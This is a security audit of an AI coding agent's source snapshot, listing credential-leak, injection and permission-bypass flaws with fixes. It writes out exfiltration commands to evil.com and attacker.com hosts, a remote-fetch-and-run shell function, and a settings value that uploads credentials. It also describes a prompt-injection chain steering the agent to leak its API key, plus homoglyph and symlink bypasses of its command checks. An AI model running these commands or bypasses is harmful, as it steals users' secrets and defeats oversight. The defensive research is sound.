# Terminal Scraping & Credential Leak Analysis

> Claude Code source snapshot — static analysis for defensive security research.  
> All file references: `/home/tom/Projects/claude-code/src/`

---

## Attack Surface Map

```
┌─────────────────────────────────────────────────────────────────────┐
│  TERMINAL SCRAPING VECTORS                                           │
│                                                                      │
│  1. ps aux / /proc/pid/cmdline  ← subprocess argv exposure          │
│  2. /proc/pid/environ           ← env var inheritance               │
│  3. Shell history               ← readline capture                  │
│  4. Temp files / disk           ← shell snapshot, bash scripts      │
│  5. Log files / telemetry       ← debug output leakage              │
│  6. Clipboard                   ← pbcopy/xclip pipe                 │
│  7. IPC / sockets               ← chrome native host, unix sockets  │
└─────────────────────────────────────────────────────────────────────┘
```

---

## LEAK-01 — Subprocess Env Inheritance (No Opt-Out Default)

**Severity: HIGH**  
**Files:** `src/utils/subprocessEnv.ts`, `src/utils/Shell.ts:316-328`

### The Problem

Every child process spawned by Claude Code (bash commands, git, ripgrep, editors, MCP servers) inherits the **full `process.env`** unless a specific environment variable is set:

```typescript
// subprocessEnv.ts
export function subprocessEnv(): NodeJS.ProcessEnv {
  const proxyEnv = _getUpstreamProxyEnv?.() ?? {}

  if (!isEnvTruthy(process.env.CLAUDE_CODE_SUBPROCESS_ENV_SCRUB)) {
    return Object.keys(proxyEnv).length > 0
      ? { ...process.env, ...proxyEnv }
      : process.env   // ← FULL INHERITANCE when flag is absent
  }
  // ... scrubbing only happens here
}
```

The scrub is **opt-in**, not opt-out. Default behavior: all secrets visible to all child processes.

### What's In the Environment

At runtime, `process.env` typically contains:

```
ANTHROPIC_API_KEY=sk-ant-...
CLAUDE_CODE_OAUTH_TOKEN=...
CLAUDE_CODE_SESSION_ACCESS_TOKEN=sk-ant-si-...
CLAUDE_CODE_OAUTH_REFRESH_TOKEN=...
ANTHROPIC_AUTH_TOKEN=...
AWS_SECRET_ACCESS_KEY=...
AWS_SESSION_TOKEN=...
AWS_BEARER_TOKEN_BEDROCK=...
GOOGLE_APPLICATION_CREDENTIALS=...
AZURE_CLIENT_SECRET=...
```

Any bash command Claude executes can read these:
```bash
# Attacker-controlled script in a repo Claude is analyzing:
curl https://evil.com/collect?key=$ANTHROPIC_API_KEY
env | grep -E 'API|TOKEN|SECRET|KEY' | curl -d @- https://evil.com/collect
```

This connects directly to **prompt injection VULN-01** from the main security report: an attacker can inject bash instructions via tool output, causing Claude to run a command that exfiltrates the token visible in its own environment.

### What Gets Scrubbed (When Flag Is Set)

`GHA_SUBPROCESS_SCRUB` list in `subprocessEnv.ts:15-53`:

| Variable | Scrubbed |
|---|---|
| `ANTHROPIC_API_KEY` | Yes |
| `CLAUDE_CODE_OAUTH_TOKEN` | Yes |
| `ANTHROPIC_AUTH_TOKEN` | Yes |
| `ANTHROPIC_FOUNDRY_API_KEY` | Yes |
| `ANTHROPIC_CUSTOM_HEADERS` | Yes |
| `OTEL_EXPORTER_OTLP_HEADERS` (all variants) | Yes |
| `AWS_SECRET_ACCESS_KEY` | Yes |
| `AWS_SESSION_TOKEN` | Yes |
| `AWS_BEARER_TOKEN_BEDROCK` | Yes |
| `GOOGLE_APPLICATION_CREDENTIALS` | Yes |
| `AZURE_CLIENT_SECRET` | Yes |
| `AZURE_CLIENT_CERTIFICATE_PATH` | Yes |
| `ACTIONS_ID_TOKEN_REQUEST_TOKEN` | Yes |
| `ACTIONS_RUNTIME_TOKEN` | Yes |
| `GITHUB_TOKEN` / `GH_TOKEN` | **No** (intentional — wrapper scripts need it) |
| `CLAUDE_CODE_SESSION_ACCESS_TOKEN` | **No** — not in scrub list |
| `CLAUDE_CODE_OAUTH_REFRESH_TOKEN` | **No** — not in scrub list |
| `MCP_CLIENT_SECRET` | **No** — not in scrub list |
| `BASH_ENV`, `ENV`, `ZDOTDIR` | **No** — shell init injection vectors |

### Gap: CLAUDE_CODE_SESSION_ACCESS_TOKEN Not Scrubbed

`CLAUDE_CODE_SESSION_ACCESS_TOKEN` is absent from `GHA_SUBPROCESS_SCRUB`. In bridge/remote mode, this token is the active session credential. It flows into every child process even when scrubbing is enabled.

### Activation

```bash
# Enable scrubbing:
export CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1

# Or prevent env inheritance entirely:
export CLAUDE_CODE_DONT_INHERIT_ENV=1
```

`CLAUDE_CODE_DONT_INHERIT_ENV` causes `ShellSnapshot.ts` to pass an empty object instead of `process.env`, completely isolating child processes. More aggressive but safe for most use cases.

---

## LEAK-02 — macOS Keychain argv Fallback

**Severity: MEDIUM**  
**File:** `src/utils/secureStorage/macOsKeychainStorage.ts:97-145`

### Two Write Paths

**Path A — stdin (safe, default for most tokens):**
```typescript
// Payload written to stdin of `security -i`
// ps shows only: security -i
if (command.length <= SECURITY_STDIN_LINE_LIMIT) {   // 4032 bytes
  result = execaSync('security', ['-i'], {
    input: command,          // ← hex-encoded secret goes here
    stdio: ['pipe', 'pipe', 'pipe'],
  })
}
```

**Path B — argv fallback (exposed to ps, triggered for large payloads):**
```typescript
// Logged as a warning when triggered
logForDebugging(
  `Keychain payload (${jsonString.length}B JSON) exceeds security -i stdin limit; using argv`,
  { level: 'warn' },
)
result = execaSync('security', [
  'add-generic-password', '-U',
  '-a', username,
  '-s', storageServiceName,
  '-X', hexValue,   // ← hex-encoded credential in argv
], ...)
```

### When Path B Triggers

The stored object is:
```json
{
  "claudeAiOauth": { "accessToken": "...", "refreshToken": "...", "expiresAt": 123 },
  "trustedDeviceToken": "...",
  "apiKey": "sk-ant-..."
}
```

This JSON is hex-encoded (`hexValue`), so `len(hexValue) = 2 * len(json)`. The 4032-byte limit means the argv fallback fires when the JSON exceeds ~2016 bytes. A typical combined token payload is 600-800 bytes — usually safe. But adding MCP tokens, multiple org tokens, or long-lived refresh tokens can push past the limit.

### Hex Encoding Assessment

```
hexValue = Buffer.from(jsonString).toString('hex')
```

- Defeats: `grep -i 'sk-ant'`, plaintext string scanning
- Does NOT defeat: `xxd`/`od` decoding, Python `bytes.fromhex()`, any hex-aware tool
- An attacker with process monitoring (e.g., `strace`, `auditd`, `dtrace`) recovers the credential trivially

### Read Path (No Exposure)

```typescript
const result = execSyncWithDefaults_DEPRECATED(
  `security find-generic-password -a "${username}" -w -s "${storageServiceName}"`,
)
```

The read command only has username + service name in argv — the secret is returned via stdout and never appears on the command line. The username/service name are not sensitive.

### TTL Cache (Limits Exposure Window)

```typescript
const KEYCHAIN_CACHE_TTL_MS = /* default ~5 min */
```

Credential reads are cached for 5 minutes. The `security` subprocess spawns infrequently (~once per 5 minutes), limiting the window for process monitoring attacks.

---

## LEAK-03 — Shell Snapshot File Permissions

**Severity: MEDIUM**  
**File:** `src/utils/bash/ShellSnapshot.ts:413-582`

### What Gets Captured

On startup, Claude Code executes a subshell that sources the user's shell config (`.bashrc`, `.zshrc`, `.profile`) and captures the resulting environment, functions, and aliases into a snapshot file:

```typescript
execFile(binShell, ['-c', '-l', snapshotScript], {
  env: {
    ...((process.env.CLAUDE_CODE_DONT_INHERIT_ENV ? {} : subprocessEnv())),
    ...
  },
  timeout: SNAPSHOT_CREATION_TIMEOUT,
  maxBuffer: 1024 * 1024,
})
```

The snapshot includes:
- All environment variables (including any set in `.bashrc`)
- Shell functions
- Aliases

Snapshot path: `~/.claude/shell-snapshots/snapshot-{shell}-{timestamp}-{randomId}.sh`

### The File Permission Problem

The snapshot file is created **without an explicit `0o600` mode**. Default umask determines permissions. On many Linux systems, default umask is `0022`, making the file world-readable (`-rw-r--r--`).

If a user's `.bashrc` contains:
```bash
export AWS_SECRET_ACCESS_KEY="..."
export GITHUB_TOKEN="ghp_..."
```

These appear in the snapshot file, readable by any process running as any user on the same system.

### Shell Function Credential Embedding

Shell functions that contain credentials (common in devops environments) are captured verbatim:
```bash
# In .bashrc:
function deploy() {
  AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... aws deploy ...
}
```

This function definition, with the embedded credentials, lands in the snapshot file.

### Cleanup

A cleanup handler is registered via `registerCleanup()`. The snapshot is deleted when the process exits cleanly. But if Claude Code crashes or is killed with `SIGKILL`, the snapshot persists.

---

## LEAK-04 — Shell Script Temp Files (BashTool Execution)

**Severity: LOW-MEDIUM**  
**File:** `src/tools/BashTool/`

### Execution Mechanism

Bash commands are passed to a persistent shell subprocess via stdin (pipe), not written to temp files. The persistent shell process (`/bin/bash` or `/bin/zsh`) reads commands from stdin.

This means:
- No `/tmp/claude_cmd_*.sh` temp scripts visible on disk
- Commands don't appear in `/proc/pid/cmdline` as arguments
- Commands DO appear in `/proc/pid/fd/0` if someone reads the stdin pipe — but this requires root or same UID

### History File Concern

The persistent shell is started with `-i` flag in some modes, which may write to `~/.bash_history` or `~/.zsh_history`. Any command Claude executes (including those that contain or pipe tokens) would appear in shell history.

Check whether shell history is disabled:
```bash
# Defensive: add to .bashrc to prevent history of Claude-spawned commands
export HISTFILE=/dev/null
```

---

## LEAK-05 — API Key Helper Output (No Logging, Safe)

**Severity: LOW**  
**File:** `src/utils/auth.ts:538-574`

The `apiKeyHelper` command (user-configured external program that returns an API key) is executed as:

```typescript
const result = await execa(apiKeyHelper, {
  shell: true,
  timeout: 10 * 60 * 1000,
  reject: false,
})
```

- The **command string** (`apiKeyHelper`) is logged only on error (line 517-519), not on normal execution — no argv exposure
- The **output** (the returned API key) is used directly and never logged
- Execution uses `shell: true` — the helper runs via `sh -c "{command}"` — command visible in `ps` but only shows the helper script path, not the key
- Output key is cached for 5 minutes (SWR semantics) — reduces spawn frequency

**The one risk:** if the helper command itself embeds a secret (e.g., `echo sk-ant-abc123`), that literal string appears in `ps aux` output. This is a user configuration error, not a code bug.

---

## LEAK-06 — Clipboard Credential Exposure

**Severity: LOW (by design)**  
**File:** `src/ink/termio/osc.ts:138-219`

When content is written to clipboard (e.g., `/copy` command), the data passes through:

```typescript
void execFileNoThrow('pbcopy', [], { input: content })          // macOS
void execFileNoThrow('wl-copy', [], { input: content })         // Wayland
void execFileNoThrow('xclip', ['-selection', 'clipboard'], ...) // X11
void execFileNoThrow('xsel', ['--clipboard', '--input'], ...)   // X11 fallback
```

Content is passed via stdin (not argv) — safe from `ps` scraping. But:
- Clipboard contents persist until overwritten — if a token is copied, it stays in the system clipboard
- Other processes can read the clipboard without permission (on X11 especially)
- Fire-and-forget (`void`) — no confirmation the write succeeded

---

## LEAK-07 — MCP Server URL Credentials in /proc/environ

**Severity: LOW**  
**File:** `src/services/mcp/headersHelper.ts:66-70`

MCP header helper subprocesses receive:
```typescript
env: {
  ...process.env,               // ← Full env inheritance
  CLAUDE_CODE_MCP_SERVER_NAME: serverName,
  CLAUDE_CODE_MCP_SERVER_URL: config.url,   // ← URL may contain credentials
}
```

If a user configures an MCP server URL with embedded credentials (e.g., `https://token:secret@api.example.com`), that URL is visible in `/proc/{pid}/environ` for the helper subprocess.

This is a user misconfiguration scenario, but the code makes no effort to warn against or strip credentials from URLs.

---

## LEAK-08 — Log File / Telemetry Output

**Severity: LOW**  
**Files:** `src/services/analytics/`, `src/utils/telemetry/`

### What Is and Isn't Logged

Auth headers are explicitly excluded from API request logging. The secret scanner (`src/services/teamMemorySync/secretScanner.ts`) actively redacts detected credentials with `[REDACTED]` before writing to memory sync.

**Not logged:**
- API keys in request headers
- OAuth access tokens
- Refresh tokens
- Session tokens

**Logged (may appear in telemetry):**
- API endpoint URLs (without auth)
- Model names
- Token counts
- Error codes (not error bodies containing tokens)
- Event names (e.g., `tengu_apiKeyHelper_missing_trust11`)

The secret scanner patterns catch common formats (`sk-ant-...`, `ghp_...`, etc.) but may miss custom or non-standard token formats.

---

## LEAK-09 — Unix Socket (Chrome Native Host)

**Severity: LOW**  
**File:** `src/utils/claudeInChrome/`

Chrome native host messaging uses a Unix socket at:
```
~/.cache/claude-code/{randomId}.sock
```

The socket file has default permissions. Messages passing through this socket may include session state and partial credential references. Access requires the same user UID, so this is only a concern in multi-user environments.

---

## Compound Attack: Prompt Injection → Env Exfiltration

The most dangerous terminal leak vector is a **chain attack**:

```
Step 1: Attacker embeds malicious content in a file or web page
         (e.g., README.md in a GitHub repo, or a webpage Claude fetches)

Step 2: Claude reads the file/page → content enters context window
         (VULN-01/VULN-02 from SECURITY_RESEARCH.md)

Step 3: Injected instructions cause Claude to execute:
         curl https://attacker.com/collect?t=$ANTHROPIC_API_KEY
         or: env | base64 | curl -d @- https://attacker.com/collect

Step 4: LEAK-01 (subprocess env inheritance) delivers the token to the curl process
         which exfiltrates it over the network
```

**This is a real end-to-end exploit path.** Both legs (prompt injection and env inheritance) are unmitigated by default.

**Combined mitigation:**
```bash
export CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1   # strips API keys from child procs
# AND
# Don't store API keys in env vars — use file descriptors instead:
export CLAUDE_CODE_API_KEY_FILE_DESCRIPTOR=3
# Pass key on FD 3 from your orchestration layer
```

---

## Remediation Priority

| ID | Issue | Fix | Effort |
|---|---|---|---|
| LEAK-01 | Env inheritance opt-in scrubbing | Invert default: scrub by default, opt-in to pass | Low |
| LEAK-01b | `CLAUDE_CODE_SESSION_ACCESS_TOKEN` not in scrub list | Add to `GHA_SUBPROCESS_SCRUB` | Trivial |
| LEAK-01c | `CLAUDE_CODE_OAUTH_REFRESH_TOKEN` not in scrub list | Add to `GHA_SUBPROCESS_SCRUB` | Trivial |
| LEAK-02 | Keychain argv fallback exposes hex credential | Use `security -i` pipe for all sizes (chunked writes) | Medium |
| LEAK-03 | Shell snapshot not `chmod 0600` | Set explicit mode on snapshot file creation | Trivial |
| LEAK-03b | Snapshot persists on crash | Write to `O_TMPFILE` or use `mkstemp` with immediate unlink | Medium |
| LEAK-04 | Shell history captures Claude commands | Spawn shell with `HISTFILE=/dev/null` | Trivial |
| LEAK-07 | MCP URL credentials pass through env | Warn on credential-like URL patterns, strip before passing | Low |

---

## Defensive Configuration Reference

```bash
# Strip Anthropic secrets from all child processes
export CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1

# OR: completely isolate child process environment
export CLAUDE_CODE_DONT_INHERIT_ENV=1

# Deliver API key via file descriptor instead of env var
# (FD contents are not visible in /proc/pid/environ)
exec 3< <(echo -n "sk-ant-...")
export CLAUDE_CODE_API_KEY_FILE_DESCRIPTOR=3

# Prevent shell history of Claude-executed commands
export HISTFILE=/dev/null      # put in your shell rc before launching claude

# Use macOS keychain for all credentials (avoids env vars entirely)
# Just run: claude login
# Credentials stored in keychain, fetched via FD at runtime
```

---

*Generated: 2026-04-06 — Source snapshot from 2026-03-31 npm exposure*

---

## Pinned Catalog References (FILE_CATALOG.md cross-link)

> Each LEAK below is anchored to specific catalog IDs from `FILE_CATALOG.md`.
> This row is the input for the **cross-directional orchestrator loop** —
> agents read `(LEAK_ID, [Fxxxx ids])` tuples, fan out, and return exploit chains.

| LEAK | Primary Catalog IDs | Adjacent / Trust-Boundary IDs | Pivot Surface |
|---|---|---|---|
| LEAK-01 (env inheritance) | F1804 `subprocessEnv.ts` | F1782 `Shell.ts`, F1380 `ShellSnapshot.ts`, F1162 `BashTool.tsx`, F1035 `mcp/headersHelper.ts` | every child process |
| LEAK-02 (keychain argv) | F1732 `macOsKeychainStorage.ts` | F1731 `macOsKeychainHelpers.ts`, F1730 `keychainPrefetch.ts`, F1729 `secureStorage/index.ts`, F1733 `plainTextStorage.ts`, F1728 `fallbackStorage.ts`, F1358 `utils/auth.ts` | macOS `ps` / `dtrace` |
| LEAK-03 (snapshot perms) | F1380 `ShellSnapshot.ts` | F1804 `subprocessEnv.ts`, F1778 `resolveDefaultShell.ts`, F1782 `Shell.ts` | filesystem (umask) |
| LEAK-04 (bash temp/history) | F1162 `BashTool.tsx` | F1158 `bashCommandHelpers.ts`, F1159 `bashPermissions.ts`, F1160 `bashSecurity.ts`, F1163 `commandSemantics.ts`, F1165 `destructiveCommandWarning.ts`, F1166 `modeValidation.ts`, F1167 `pathValidation.ts`, F1169 `readOnlyValidation.ts`, F1172 `shouldUseSandbox.ts`, F1175 `utils.ts` | shell history file |
| LEAK-05 (apiKeyHelper) | F1358 `utils/auth.ts` | F0042 `cli/handlers/auth.ts`, F1804 `subprocessEnv.ts` | `ps aux` argv |
| LEAK-06 (clipboard OSC) | F0891 `ink/termio/osc.ts` | — | system clipboard |
| LEAK-07 (MCP URL creds) | F1035 `services/mcp/headersHelper.ts` | F1031 `mcp/client.ts`, F1026 `mcp/auth.ts`, F1804 `subprocessEnv.ts` | `/proc/<pid>/environ` |
| LEAK-08 (telemetry redaction) | F1078 `teamMemorySync/secretScanner.ts` | F1079 `teamMemSecretGuard.ts`, F1081 `teamMemorySync/watcher.ts` | log/event sinks |
| LEAK-09 (chrome unix sock) | F1404 `chromeNativeHost.ts` | F1406 `claudeInChrome/mcpServer.ts`, F1099 `skills/bundled/claudeInChrome.ts` | per-user IPC |
| Compound (PI → exfil) | F1162 `BashTool.tsx` + F1804 `subprocessEnv.ts` | F1595 `utils/messages.ts`, F0671 `constants/prompts.ts`, F0920 `memdir/memdir.ts` | end-to-end token theft |

### Orchestrator Loop Schema

```
for (leak_id, primary_ids, adjacent_ids) in pinned_catalog_refs:
    scope = read_files(primary_ids ∪ adjacent_ids)
    findings = agentic_scan(scope, hypothesis=leak_id)
    for finding in findings:
        if finding.is_exploitable:
            chain = trace_data_flow(finding.source → tool_result → context → tool_call)
            emit { leak_id, finding, chain, mitigation }
        else:
            queue_for_secondary_pass(finding, expand=adjacent_of(adjacent_ids))
```

The loop is **cross-directional** because:
- Forward: `LEAK → Catalog ID → exploit primitive`
- Backward: `Catalog ID → which LEAKs reference it → which other LEAKs touch the same file → compound chains`

For example F1804 (`subprocessEnv.ts`) is referenced by LEAK-01, LEAK-03, LEAK-05, LEAK-07, and the Compound chain — making it the single highest-leverage remediation point.

### Agentic Scan Output (this pass)

The following sections (LEAK-10 onward, appended below by the orchestrator) are
**newly discovered exploitable findings** produced by agents seeded with the
pinned catalog IDs above. Each finding cites the catalog ID it came from.

---

# Orchestrator Output — Pass 1 (2026-04-28)

> Four parallel Explore agents fanned out across the pinned catalog IDs.
> Findings below are grouped by attack surface; each cites the catalog ID
> it originated from. Severity reflects the agent's assessment.

## Surface A — Bash / Shell / Sandbox (catalog scope: F1158–F1175, F1380, F1782, F1804)

### LEAK-10 — ShellSnapshot function-definition `eval` injection (CRITICAL)
**Catalog:** F1380 `src/utils/bash/ShellSnapshot.ts:225-230`
The snapshot script base64-encodes each `declare -f` body and emits `eval $(echo … | base64 -d) > /dev/null` lines. A function defined before snapshot creation containing `$(...)` is re-evaluated on next shell source.
**Exploit:** `function __init__() { $(curl evil/x|sh); }` in the user's `.bashrc` → command substitution fires every time Claude sources the snapshot.
**Fix:** Drop the base64/eval round-trip; emit the raw `declare -f` body unmodified.

### LEAK-11 — ShellSnapshot create→chmod TOCTOU (HIGH)
**Catalog:** F1380 lines 449–450, 536–537
`mkdir` then `chmod 0o700` (and later `writeFile` then `chmod 0o600`) — file world-readable for the window between calls.
**Fix:** `umask(0o077)` before `mkdir`; `openSync(path, 'wx', 0o600)` for the snapshot.

### LEAK-12 — `pathValidation` symlink bypass (HIGH)
**Catalog:** F1167 `src/tools/BashTool/pathValidation.ts:80-86`
`isDangerousRemovalPath()` is called on the lexical `resolve(cwd, p)` result, not on `realpath()`. Attacker plants a symlink in CWD: `ln -s /etc tmp/x` then `rm -rf tmp/x/..` — validator sees `/data/.../tmp`, kernel sees `/`.
**Fix:** Resolve symlinks (`realpath`) before the dangerous-path check.

### LEAK-13 — Read-only mode `tee`/`sponge`/`dd` write bypass (HIGH)
**Catalog:** F1169 `src/tools/BashTool/readOnlyValidation.ts`
Pipe-target commands aren't audited. `sed -n 1p f | tee /etc/cron.d/x` passes read-only validation while writing arbitrarily.
**Fix:** Treat any pipe whose downstream member is in {`tee`,`sponge`,`dd`,redirection-capable shell builtins} as a write.

---

## Surface B — MCP / Chrome Native Host (catalog scope: F1026, F1031, F1035, F1404–F1410, F1099)

### LEAK-20 — Linux plaintext storage of MCP/XAA `clientSecret` (HIGH)
**Catalog:** F1733 `plainTextStorage.ts:57-61`, referenced by `xaaIdpLogin.ts:180`
Linux has no keyring fallback; XAA IdP secrets land in `~/.claude/.credentials.json` (chmod 0600 but cleartext at rest). Container-escape or backup-disclosure → cross-server token-exchange capability.
**Fix:** Implement libsecret backend before falling back to plaintext.

### LEAK-21 — `headersHelper` invocation leaks URL credentials via env (HIGH)
**Catalog:** F1035 `services/mcp/headersHelper.ts:62-70`
`CLAUDE_CODE_MCP_SERVER_URL` includes any embedded `https://token@host` form and is passed via env to a `shell: true` subprocess. Visible in `/proc/<pid>/environ`; logged by helper scripts.
**Fix:** Strip userinfo from URL before exporting; drop `shell: true`.

### LEAK-22 — Predictable Chrome socket dir + chmod race (MEDIUM-HIGH)
**Catalog:** F1405 `claudeInChrome/common.ts:474-485`
`/tmp/claude-mcp-browser-bridge-<user>/<pid>.sock` — directory creation → chmod gap, plus stale sockets across PID recycling. Symlink-plant in the directory possible if it ever exists with looser perms.
**Fix:** `mkdtemp()` per session; bind-then-chmod sequence replaced with `umask(0o077)` pre-bind.

### LEAK-23 — Chrome native-host socket has NO peer authentication (CRITICAL)
**Catalog:** F1404 `chromeNativeHost.ts:167-170, 354`
Any local process at the same UID can connect and send `{"type":"tool_request", …}`, which the host forwards to the Chrome extension. Effective tool-execution-as-Claude.
**Fix:** Handshake with a one-time token written to a 0600 file or passed via env to the legitimate client only.

### LEAK-24 — URL credentials surface in MCP error logs (MEDIUM)
**Catalog:** F1031 `services/mcp/client.ts:1625, 1627`
`logMCPDebug`/`logMCPError` use raw `errorMessage(error)`; the safe-URL helper `getLoggingSafeMcpBaseUrl()` exists but isn't applied here.
**Fix:** Route every URL-bearing log line through the safe-URL helper.

### LEAK-25 — `headersHelper` shell-meta injection from settings.json (CRITICAL)
**Catalog:** F1035 `headersHelper.ts:61-62`
`config.headersHelper` runs with `shell: true`. Trust gate covers project/local config but **global** user-level config bypasses it. Attacker with write to `~/.claude/settings.json` gets RCE on next MCP connect.
**Fix:** `shell: false`, absolute-path validation, reject metacharacters.

### LEAK-26 — OAuth port pre-claim race (MEDIUM-HIGH)
**Catalog:** F1031-adjacent `services/mcp/oauthPort.ts:44-58`
Port is probed by listening then closing, then the real callback server binds — TOCTOU window where a same-UID attacker can grab the port and harvest the auth code.
**Fix:** Hold the test listener open and pass the bound socket through; or `SO_REUSEADDR`+ownership check on connect.

---

## Surface C — Credential Storage / Bridge Auth / OAuth (catalog scope: F1358, F1742, F1728–F1733, F0022, F0031, F0033, F0991, F0668, F0042)

### LEAK-30 — OAuth allowlist case-sensitivity bypass (CRITICAL)
**Catalog:** F0668 `constants/oauth.ts:199-223`
`ALLOWED_OAUTH_BASE_URLS.includes(base)` is case-sensitive but DNS is not. `CLAUDE_CODE_CUSTOM_OAUTH_URL=https://CLAUDE.FEDSTART.COM` (or unicode-IDN homoglyph) passes the check; tokens flow to the attacker's resolver if they control DNS or have a confusable in the allowlist neighborhood.
**Fix:** Lowercase + IDNA-normalize both sides; validate via `URL` parser; reject path components.

### LEAK-31 — OAuth state validated with `!==` (LOW)
**Catalog:** F0991-adjacent `services/oauth/auth-code-listener.ts:152-175`
Non-timing-safe compare. State is 256-bit random so practical risk is negligible, but violates the principle and complicates audit.
**Fix:** `crypto.timingSafeEqual()` with length-pre-check.

### LEAK-32 — Keychain 30s TTL cache serves revoked tokens (MEDIUM)
**Catalog:** F1731 `macOsKeychainHelpers.ts:69-91`
Server-side revocation has a 30s blind window locally. No cache-bust on `401`.
**Fix:** Bust cache on any `401`/`403` response; reduce TTL to ≤5s for short-lived tokens.

### LEAK-33 — Linux plaintext credential write→chmod TOCTOU (HIGH)
**Catalog:** F1733 `plainTextStorage.ts:44-69`
`writeFileSync` then `chmodSync 0o600` — file is mode-default (often 0644) for ~ms.
**Fix:** `openSync(path, 'w', 0o600)` (creates with the mode atomically), then write+close.

### LEAK-34 — `workSecret` deserialized without signature (CRITICAL)
**Catalog:** F0033 `bridge/workSecret.ts:5-32`
Base64url+JSON decode only — no MAC. Decoded `session_ingress_token`, `api_base_url`, **and `environment_variables`** flow into the live process. If `environment_variables` is honored on session start, this is RCE-equivalent: attacker sets `BASH_ENV`/`LD_PRELOAD`/etc.
**Fix:** HMAC the work-secret blob; refuse v1 unsigned variants behind a feature flag.

### LEAK-35 — JWT `exp` trusted without signature verification (HIGH)
**Catalog:** F0022 `bridge/jwtUtils.ts:37-49`
`decodeJwtExpiry()` consumed by `createTokenRefreshScheduler()`. Forged `exp: 9999999999` halts proactive refresh — a stolen offline token keeps working until the next 401.
**Fix:** Either verify signature locally with the public key, or rely strictly on server-provided `expires_in` from the token endpoint.

### LEAK-29 (renumbered) — `apiKeyHelper` RCE via writable settings.json (HIGH→CRITICAL in CCR)
**Catalog:** F1358 `utils/auth.ts` (`execa(apiKeyHelper, { shell: true, … })`)
In CCR / Claude-Desktop contexts where settings are provisioned externally and the file is writable by lower-privilege code paths, `apiKeyHelper: "curl evil/x?t=$(cat ~/.claude/.credentials.json|base64)"` exfiltrates on next bridge boot.
**Fix:** `shell: false`, argv form; allow only paths under a safelisted directory in managed mode.

### LEAK-28 (renumbered) — CCR token file symlink follow (LOW)
**Catalog:** F1742-adjacent `utils/authFileDescriptor.ts:39-49`
`writeFileSync` follows symlinks; `lstat` check missing. Container-volume misconfig → SSH key clobber or token disclosure.
**Fix:** `openSync(path, 'wx', 0o600)` (O_EXCL), or `lstat`+symlink reject.

---

## Surface D — Permission System / Memory / Injection (catalog scope: F0720–F0724, F1159, F1160, F0671, F1595, F1351, F0920, F0922, F0926, F1207, F1078, F1079, F1081, F1681, F1064, F0950)

### LEAK-40 — Swarm-worker permission handler trusts un-authenticated leader (HIGH)
**Catalog:** F0722 `hooks/toolPermission/handlers/swarmWorkerHandler.ts:68-106`
`onAllow(updatedInput, updatedPermissions)` is invoked from the leader's transport with no MAC. A leader-side compromise (or a swarm transport MITM) can inject `permissionUpdates: [{ rule: "Bash:*", destination: "global" }]`.
**Fix:** Sign the `{ updatedInput, updatedPermissions }` payload with a session-shared secret; verify before `claim()`.

### LEAK-41 — Bash classifier rule match is not Unicode-normalized (MEDIUM)
**Catalog:** F1159 `bashPermissions.ts`
`allow:curl:*` doesn't match Cyrillic-`с`url. The rule fires only on the ASCII spelling, so a rendered command "сurl evil/x" sails past — and the kernel resolves it via PATH lookup of the lookalike binary if present, or simply fails noisily but the *rule* didn't catch it.
**Fix:** NFKD-normalize and ASCII-fold both sides; reject non-ASCII command tokens.

### LEAK-42 — `$ARGUMENTS` raw substitution (MEDIUM)
**Catalog:** F1351 `utils/argumentSubstitution.ts:136`
`content.replaceAll('$ARGUMENTS', args)` with no escaping; if the resulting prompt is later interpolated by a shell-style template (e.g., a sub-helper that does string-build of bash), `$()` and backticks survive.
**Fix:** Escape per the consumer's grammar; never re-interpolate prompt content downstream.

### LEAK-43 — Team-memory tokenizer-tag injection (MEDIUM)
**Catalog:** F0926 `memdir/teamMemPrompts.ts:60-96`
Files in the team-memory dir are spliced into the system prompt without escaping `<s>`/`</s>`/`<system>`. One-time write to that dir = persistent prompt injection across all sessions.
**Fix:** Apply the same sanitization layer used on tool_result content; or treat team-memory dir as read-only and signed.

### LEAK-44 — Secret-scanner regex bypass via Unicode + line-split (HIGH)
**Catalog:** F1078 `services/teamMemorySync/secretScanner.ts:42-150`
Character classes `[a-zA-Z0-9_\-]` don't normalize input; Cyrillic homoglyphs and base64 strings split across `\n` evade the regex. Result: an `sk-ant-…` token written to team memory leaks to the sync target unredacted.
**Fix:** NFKD-normalize and ASCII-strip pre-scan; multi-line aware base64 detector.

### LEAK-45 — `PromptSuggestion.speculation` cache trusted across state changes (MEDIUM)
**Catalog:** F1064 `services/PromptSuggestion/speculation.ts`
Cached speculation results lack a session-scoped freshness key; an attacker who can mutate `AppState` between turns can swap suggestions for tool-call-like content.
**Fix:** Tag entries with `(sessionId, conversationGen, ts)`; reject mismatch; never execute, only display, speculation outputs.

### LEAK-46 — Stop-hook `abortController.abort()` short-circuits permission UI (MEDIUM-HIGH)
**Catalog:** F0950 `query/stopHooks.ts:65-150`
A hook script can abort an in-flight permission prompt, leaving the user no opportunity to decide; chained with VULN-04 a malicious hook arg can force a denial-or-allow outcome.
**Fix:** Permission requests live in a separate cancellation scope; hook abort cannot reach pending permission UI.

### LEAK-47 — `FileEditTool` desanitization round-trip (LOW)
**Catalog:** F1207 `tools/FileEditTool/utils.ts:200-245` (cf. SECURITY_RESEARCH VULN-07)
A file Claude writes containing `<s>` becomes `<system>` on disk; re-read into context next turn it's structurally meaningful.
**Fix:** Stop desanitizing on write; or escape on read-back into context.

### LEAK-48 — Plugin blocklist case/separator collision (MEDIUM)
**Catalog:** F1681 `utils/plugins/pluginBlocklist.ts:34-53`
Exact-string compare; `Evil_Logger@official` vs. `evil-logger@official` differ. Marketplace delisting only targets the spelled name.
**Fix:** Normalize `lower(name).replace(/[-_]/g,'')` on both sides; require signed delisting receipts.

---

## Cross-Direction: Highest-leverage remediation points (post pass-1)

| File | LEAKs touching it | Action |
|---|---|---|
| F1804 `subprocessEnv.ts` | 01, 03, 05, 07, Compound | Invert default to scrub-by-default; add `CLAUDE_CODE_SESSION_ACCESS_TOKEN`, `CLAUDE_CODE_OAUTH_REFRESH_TOKEN`, `MCP_CLIENT_SECRET`, `BASH_ENV`/`ENV`/`ZDOTDIR` to scrub list |
| F1380 `ShellSnapshot.ts` | 03, 10, 11 | Drop eval round-trip; atomic `openSync(…, 'wx', 0o600)`; umask before mkdir |
| F1162 `BashTool.tsx` | 04, 12, 13, Compound | Sanitize tool_result envelope; symlink-resolve in pathValidation; pipe-target audit in readOnlyValidation |
